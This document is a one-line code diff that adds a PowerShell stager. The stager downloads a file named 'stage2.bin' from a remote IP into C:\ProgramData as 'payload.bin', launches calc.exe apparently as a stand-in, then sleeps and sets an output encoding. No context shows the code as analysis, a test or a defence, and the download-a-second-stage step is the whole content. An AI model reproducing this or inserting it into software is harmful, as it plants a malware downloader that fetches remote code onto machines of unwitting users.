@@ -1,0 +1,1 @@
+try { $RemoteUrl = 'http://198.51.100.218/cdn/stage2.bin'; $LocalPath = "C:\ProgramData\payload.bin"; (New-Object System.Net.WebClient).DownloadFile($RemoteUrl, $LocalPath); Start-Process -FilePath "calc.exe"; Start-Sleep -Seconds 29; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8" } catch { Write-Warning "Stage transfer failed" }
